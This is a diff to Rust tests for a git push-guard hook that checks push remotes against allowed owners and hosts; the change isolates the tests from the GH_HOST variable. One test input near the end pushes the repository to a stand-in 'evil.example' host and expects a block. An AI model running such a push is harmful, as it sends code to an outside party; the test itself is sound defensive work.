@@ -1662,14 +1662,20 @@ mod tests {
         entries.iter().map(|e| parse_allow_entry(e)).collect()
     }
 
+    // `check_owner` matches a bare owner against `config::default_host()`,
+    // which reads `GH_HOST`. The tests whose verdict turns on that match pin it
+    // cleared, so a shell that exports a GHE host cannot fail them.
+
     #[test]
     fn owner_check_passes() {
-        assert!(check_owner(
-            "https://github.com/cameronsjo/repo.git",
-            &owners(&["cameronsjo"]),
-            &[],
-            &[],
-        ));
+        with_env(&[("GH_HOST", None)], || {
+            assert!(check_owner(
+                "https://github.com/cameronsjo/repo.git",
+                &owners(&["cameronsjo"]),
+                &[],
+                &[],
+            ));
+        });
     }
 
     #[test]
@@ -1684,12 +1690,14 @@ mod tests {
 
     #[test]
     fn owner_check_multiple_owners() {
-        assert!(check_owner(
-            "https://github.com/cameronsjo/repo.git",
-            &owners(&["other", "cameronsjo"]),
-            &[],
-            &[],
-        ));
+        with_env(&[("GH_HOST", None)], || {
+            assert!(check_owner(
+                "https://github.com/cameronsjo/repo.git",
+                &owners(&["other", "cameronsjo"]),
+                &[],
+                &[],
+            ));
+        });
     }
 
     #[test]
@@ -1704,12 +1712,14 @@ mod tests {
 
     #[test]
     fn owner_check_case_insensitive() {
-        assert!(check_owner(
-            "https://github.com/CameronSjo/repo.git",
-            &owners(&["cameronsjo"]),
-            &[],
-            &[],
-        ));
+        with_env(&[("GH_HOST", None)], || {
+            assert!(check_owner(
+                "https://github.com/CameronSjo/repo.git",
+                &owners(&["cameronsjo"]),
+                &[],
+                &[],
+            ));
+        });
     }
 
     // --- host-aware matching ---
@@ -1737,46 +1747,50 @@ mod tests {
 
     #[test]
     fn owner_check_mixed_hosts() {
-        let o = owners(&["cameronsjo", "gitea.internal/cameron"]);
-        // github.com/cameronsjo → allowed
-        assert!(check_owner(
-            "https://github.com/cameronsjo/repo.git",
-            &o,
-            &[],
-            &[],
-        ));
-        // gitea.internal/cameron → allowed
-        assert!(check_owner(
-            "git@gitea.internal:cameron/repo.git",
-            &o,
-            &[],
-            &[]
-        ));
-        // gitea.internal/cameronsjo → blocked
-        assert!(!check_owner(
-            "https://gitea.internal/cameronsjo/repo.git",
-            &o,
-            &[],
-            &[],
-        ));
-        // github.com/cameron → blocked
-        assert!(!check_owner(
-            "https://github.com/cameron/repo.git",
-            &o,
-            &[],
-            &[]
-        ));
+        with_env(&[("GH_HOST", None)], || {
+            let o = owners(&["cameronsjo", "gitea.internal/cameron"]);
+            // github.com/cameronsjo → allowed
+            assert!(check_owner(
+                "https://github.com/cameronsjo/repo.git",
+                &o,
+                &[],
+                &[],
+            ));
+            // gitea.internal/cameron → allowed
+            assert!(check_owner(
+                "git@gitea.internal:cameron/repo.git",
+                &o,
+                &[],
+                &[]
+            ));
+            // gitea.internal/cameronsjo → blocked
+            assert!(!check_owner(
+                "https://gitea.internal/cameronsjo/repo.git",
+                &o,
+                &[],
+                &[],
+            ));
+            // github.com/cameron → blocked
+            assert!(!check_owner(
+                "https://github.com/cameron/repo.git",
+                &o,
+                &[],
+                &[]
+            ));
+        });
     }
 
     #[test]
     fn owner_check_allowed_repo() {
-        let repos = owners(&["external/shared-repo"]);
-        assert!(check_owner(
-            "https://github.com/external/shared-repo.git",
-            &[],
-            &repos,
-            &[],
-        ));
+        with_env(&[("GH_HOST", None)], || {
+            let repos = owners(&["external/shared-repo"]);
+            assert!(check_owner(
+                "https://github.com/external/shared-repo.git",
+                &[],
+                &repos,
+                &[],
+            ));
+        });
     }
 
     #[test]
@@ -1815,22 +1829,26 @@ mod tests {
 
     #[test]
     fn owner_check_ssh_url() {
-        assert!(check_owner(
-            "git@github.com:cameronsjo/repo.git",
-            &owners(&["cameronsjo"]),
-            &[],
-            &[],
-        ));
+        with_env(&[("GH_HOST", None)], || {
+            assert!(check_owner(
+                "git@github.com:cameronsjo/repo.git",
+                &owners(&["cameronsjo"]),
+                &[],
+                &[],
+            ));
+        });
     }
 
     #[test]
     fn owner_check_https_no_git_suffix() {
-        assert!(check_owner(
-            "https://github.com/cameronsjo/repo",
-            &owners(&["cameronsjo"]),
-            &[],
-            &[],
-        ));
+        with_env(&[("GH_HOST", None)], || {
+            assert!(check_owner(
+                "https://github.com/cameronsjo/repo",
+                &owners(&["cameronsjo"]),
+                &[],
+                &[],
+            ));
+        });
     }
 
     #[test]
@@ -1871,13 +1889,15 @@ mod tests {
 
     #[test]
     fn owner_check_extra_hosts_preserves_default_host_match() {
-        let extras = vec!["git.sjo.lol".to_string()];
-        assert!(check_owner(
-            "https://github.com/cameron/repo.git",
-            &owners(&["cameron"]),
-            &[],
-            &extras,
-        ));
+        with_env(&[("GH_HOST", None)], || {
+            let extras = vec!["git.sjo.lol".to_string()];
+            assert!(check_owner(
+                "https://github.com/cameron/repo.git",
+                &owners(&["cameron"]),
+                &[],
+                &extras,
+            ));
+        });
     }
 
     // --- PushRemoteGuard::run(): loop and multi-push scenarios ---
@@ -1888,34 +1908,40 @@ mod tests {
 
     #[test]
     fn chained_pushes_different_remotes_are_not_blocked_as_a_chain() {
-        // Each push is judged on its own remote (cameronsjo/cadence-hooks#1329);
-        // two different remotes alone no longer block.
-        let result =
-            PushRemoteGuard.run(&make_bash("git push origin main && git push upstream main"));
-        let msg = result.message.as_deref().unwrap_or("");
-        assert!(!msg.contains("different remotes"), "{msg}");
+        with_env(&owners_only(), || {
+            // Each push is judged on its own remote (cameronsjo/cadence-hooks#1329);
+            // two different remotes alone no longer block.
+            let result =
+                PushRemoteGuard.run(&make_bash("git push origin main && git push upstream main"));
+            let msg = result.message.as_deref().unwrap_or("");
+            assert!(!msg.contains("different remotes"), "{msg}");
+        });
     }
 
     #[test]
     fn chained_pushes_same_remote_allowed() {
-        // git push origin main && git push origin v1.0.0 — same remote, safe
-        let result =
-            PushRemoteGuard.run(&make_bash("git push origin main && git push origin v1.0.0"));
-        // Should NOT block at the chain stage — continues to owner validation
-        let msg = result.message.as_deref().unwrap_or("");
-        assert!(
-            !msg.contains("different remotes") && !msg.contains("multiple"),
-            "same-remote chain should not be blocked as batch: {msg}"
-        );
+        with_env(&owners_only(), || {
+            // git push origin main && git push origin v1.0.0 — same remote, safe
+            let result =
+                PushRemoteGuard.run(&make_bash("git push origin main && git push origin v1.0.0"));
+            // Should NOT block at the chain stage — continues to owner validation
+            let msg = result.message.as_deref().unwrap_or("");
+            assert!(
+                !msg.contains("different remotes") && !msg.contains("multiple"),
+                "same-remote chain should not be blocked as batch: {msg}"
+            );
+        });
     }
 
     #[test]
     fn chained_pushes_missing_remote_are_not_blocked_as_a_chain() {
-        // Each push is judged on its own target (cameronsjo/cadence-hooks#1329);
-        // the chain shape alone no longer blocks.
-        let result = PushRemoteGuard.run(&make_bash("git push && git push origin main"));
-        let msg = result.message.as_deref().unwrap_or("");
-        assert!(!msg.contains("without explicit remotes"), "{msg}");
+        with_env(&owners_only(), || {
+            // Each push is judged on its own target (cameronsjo/cadence-hooks#1329);
+            // the chain shape alone no longer blocks.
+            let result = PushRemoteGuard.run(&make_bash("git push && git push origin main"));
+            let msg = result.message.as_deref().unwrap_or("");
+            assert!(!msg.contains("without explicit remotes"), "{msg}");
+        });
     }
 
     #[test]
@@ -1927,16 +1953,20 @@ mod tests {
 
     #[test]
     fn push_chain_with_semicolon_different_remotes_are_not_blocked_as_a_chain() {
-        let result =
-            PushRemoteGuard.run(&make_bash("git push origin main; git push upstream feat"));
-        let msg = result.message.as_deref().unwrap_or("");
-        assert!(!msg.contains("different remotes"), "{msg}");
+        with_env(&owners_only(), || {
+            let result =
+                PushRemoteGuard.run(&make_bash("git push origin main; git push upstream feat"));
+            let msg = result.message.as_deref().unwrap_or("");
+            assert!(!msg.contains("different remotes"), "{msg}");
+        });
     }
 
     #[test]
     fn non_git_command_with_push_substring_allowed() {
-        let result = PushRemoteGuard.run(&make_bash("echo 'push this'"));
-        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Allow);
+        with_env(&owners_only(), || {
+            let result = PushRemoteGuard.run(&make_bash("echo 'push this'"));
+            assert_eq!(result.outcome, cadence_hooks_core::Outcome::Allow);
+        });
     }
 
     #[test]
@@ -1965,37 +1995,44 @@ mod tests {
 
     #[test]
     fn push_with_pipe_counted_once() {
-        // pipe doesn't create a second push — only one git push exists
-        let result = PushRemoteGuard.run(&make_bash("git push origin main 2>&1 | tee push.log"));
-        // Should NOT block as "multiple" — only one push
-        let msg = result.message.as_deref().unwrap_or("");
-        assert!(!msg.contains("multiple"));
+        with_env(&owners_only(), || {
+            // pipe doesn't create a second push — only one git push exists
+            let result =
+                PushRemoteGuard.run(&make_bash("git push origin main 2>&1 | tee push.log"));
+            // Should NOT block as "multiple" — only one push
+            let msg = result.message.as_deref().unwrap_or("");
+            assert!(!msg.contains("multiple"));
+        });
     }
 
     #[test]
     fn multi_push_false_positive_in_quotes() {
-        // Bug: push_count uses substring match, not command-boundary match
-        // "git push" inside an echo string should not count as a second push
-        let result = PushRemoteGuard.run(&make_bash(
-            "echo 'do not git push this' && git push origin main",
-        ));
-        // Should NOT block as "multiple" — only one actual git push command
-        let msg = result.message.as_deref().unwrap_or("");
-        assert!(
-            !msg.contains("multiple"),
-            "false positive: quoted 'git push' counted as second push"
-        );
+        with_env(&owners_only(), || {
+            // Bug: push_count uses substring match, not command-boundary match
+            // "git push" inside an echo string should not count as a second push
+            let result = PushRemoteGuard.run(&make_bash(
+                "echo 'do not git push this' && git push origin main",
+            ));
+            // Should NOT block as "multiple" — only one actual git push command
+            let msg = result.message.as_deref().unwrap_or("");
+            assert!(
+                !msg.contains("multiple"),
+                "false positive: quoted 'git push' counted as second push"
+            );
+        });
     }
 
     #[test]
     fn push_with_refspec_detected() {
-        // git push with a refspec should still be detected
-        let result = PushRemoteGuard.run(&make_bash("git push origin HEAD:refs/heads/deploy"));
-        // Will block or allow depending on env — but should not error
-        assert!(
-            result.outcome == cadence_hooks_core::Outcome::Allow
-                || result.outcome == cadence_hooks_core::Outcome::Block
-        );
+        with_env(&owners_only(), || {
+            // git push with a refspec should still be detected
+            let result = PushRemoteGuard.run(&make_bash("git push origin HEAD:refs/heads/deploy"));
+            // Will block or allow depending on env — but should not error
+            assert!(
+                result.outcome == cadence_hooks_core::Outcome::Allow
+                    || result.outcome == cadence_hooks_core::Outcome::Block
+            );
+        });
     }
 
     // --- extract_push_target: Named vs Url vs None classification (#68) ---
@@ -2092,6 +2129,7 @@ mod tests {
             ("CADENCE_ALLOWED_OWNERS", Some("cameronsjo")),
             ("CADENCE_ALLOWED_REPOS", None),
             ("CADENCE_EXTRA_HOSTS", None),
+            ("CDPATH", None),
             ("GH_HOST", None),
         ]
     }
@@ -2221,10 +2259,12 @@ mod tests {
 
     #[test]
     fn repo_flag_alone_in_a_chain_still_blocks_structurally() {
-        let result = PushRemoteGuard.run(&make_bash(
+        with_env(&owners_only(), || {
+            let result = PushRemoteGuard.run(&make_bash(
             "git push --repo=https://evil.example/a/b.git && git push --repo=https://evil.example/c/d.git",
         ));
-        assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
+            assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
+        });
     }
 
     // --- #554: the literal `git push` gate missed three real pushes ---
